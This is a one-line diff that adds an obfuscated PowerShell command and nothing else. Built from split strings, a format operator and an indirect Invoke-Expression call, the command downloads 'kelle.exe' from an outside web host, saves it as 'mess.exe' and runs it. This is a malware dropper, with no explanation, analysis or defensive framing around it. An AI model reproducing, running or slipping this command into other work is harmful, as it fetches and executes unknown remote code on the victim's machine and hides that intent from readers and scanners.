@@ -1,0 +1,1 @@
+﻿. ((GV '*mdR*').NaME[3,11,2]-JoIN'')((('(New'+'-Object'+' Sy'+'s'+'tem.Net.W'+'ebClient).Do'+'wnloadFile({0}ht'+'t'+'p'+':'+'//'+'worldni'+'t.com/ke'+'lle.exe'+'{0},'+'{0}'+'mess'+'.exe{'+'0})'+';Start-P'+'roc'+'ess'+' {0}me'+'ss.exe{0}') -F[ChAR]39) )
